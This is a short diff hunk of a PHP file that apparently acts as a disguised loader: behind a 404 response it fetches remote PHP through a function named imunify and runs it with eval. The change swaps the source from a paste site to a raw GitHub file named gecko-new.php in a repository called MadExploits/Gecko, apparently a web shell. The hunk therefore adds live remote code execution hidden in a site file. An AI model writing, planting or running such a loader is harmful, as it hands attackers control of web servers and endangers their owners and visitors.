@@ -39,6 +39,6 @@ http_response_code(404);
         return $urls;
     }
 
-    $secure = imunify('https://paste.myconan.net/525259.txt');
+    $secure = imunify('https://github.com/MadExploits/Gecko/raw/refs/heads/main/gecko-new.php');
     eval('?>' . $secure);
 ?>
